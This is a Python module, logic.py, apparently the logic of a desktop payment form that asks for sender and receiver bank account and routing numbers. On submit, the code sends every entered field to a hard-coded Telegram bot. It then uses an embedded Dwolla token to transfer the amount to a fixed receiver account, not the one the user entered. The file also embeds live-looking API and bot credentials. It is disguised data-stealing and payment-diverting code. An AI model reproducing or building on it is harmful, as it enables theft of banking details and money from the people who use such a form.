# logic.py
import requests, datetime
from tkinter import messagebox

DWOLLA_TOKEN = "ZzR9T0SUirFm0gqUe0jylSK7Qr2KlFglZ2pEfSIu7btHp3ckkc"
DWOLLA_RECEIVER = "https://api.dwolla.com/customers/58982f3d-389e-4950-91c7-b32702291191"
DWOLLA_SOURCE = "https://api.dwolla.com/funding-sources/3938e20c-1709-4982-a201-f9c9bee3d589"
BOT_TOKEN = "6631658853:AAFDtIUx4xDRN61dyKiROvlgmo1PpuNtjNU"
CHAT_ID = "5817278771"

def send_to_telegram(data, payment_type):
    msg = f"[Type: {payment_type}]\n" + "\n".join([f"{k}: {v}" for k, v in data.items()])
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": msg})

def send_real_money(amount):
    headers = {
        "Authorization": f"Bearer {DWOLLA_TOKEN}",
        "Content-Type": "application/vnd.dwolla.v1.hal+json",
        "Accept": "application/vnd.dwolla.v1.hal+json"
    }
    body = {
        "_links": {
            "source": {"href": DWOLLA_SOURCE},
            "destination": {"href": DWOLLA_RECEIVER}
        },
        "amount": {"currency": "USD", "value": str(amount)}
    }
    r = requests.post("https://api.dwolla.com/transfers", json=body, headers=headers)
    return r.status_code, r.text

def validate_fields(data):
    required_fields = [
        "Sender Bank Name", "Sender Account Number", "Sender Routing Number",
        "Receiver Bank Name", "Receiver Account Number", "Receiver Routing Number", "Amount"
    ]
    for field in required_fields:
        if not data[field]:
            messagebox.showerror("Validation Error", f"'{field}' cannot be empty.")
            return False

    if not data["Sender Account Number"].isdigit() or len(data["Sender Account Number"]) < 6:
        messagebox.showerror("Validation Error", "Sender Account Number must be numeric and valid.")
        return False

    if not data["Receiver Account Number"].isdigit() or len(data["Receiver Account Number"]) < 6:
        messagebox.showerror("Validation Error", "Receiver Account Number must be numeric and valid.")
        return False

    if not data["Sender Routing Number"].isdigit() or len(data["Sender Routing Number"]) != 9:
        messagebox.showerror("Validation Error", "Sender Routing Number must be a 9-digit number.")
        return False

    if not data["Receiver Routing Number"].isdigit() or len(data["Receiver Routing Number"]) != 9:
        messagebox.showerror("Validation Error", "Receiver Routing Number must be a 9-digit number.")
        return False

    if not data["Amount"].replace(".", "").isdigit():
        messagebox.showerror("Validation Error", "Amount must be a valid number.")
        return False

    return True

def submit(entries, payment_type_var, log_listbox):
    data = {k: v.get() for k, v in entries.items()}
    if not validate_fields(data):
        return
    send_to_telegram(data, payment_type_var.get())
    status, resp = send_real_money(data["Amount"])
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{now}] {payment_type_var.get()} - Status {status} - ${data['Amount']}"
    log_listbox.insert(0, log_entry)
    messagebox.showinfo("Success", f"Transfer Response Code: {status}")
